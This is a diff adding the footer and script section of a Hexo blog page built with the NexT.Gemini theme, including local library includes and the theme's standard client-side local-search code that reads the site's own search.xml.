+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
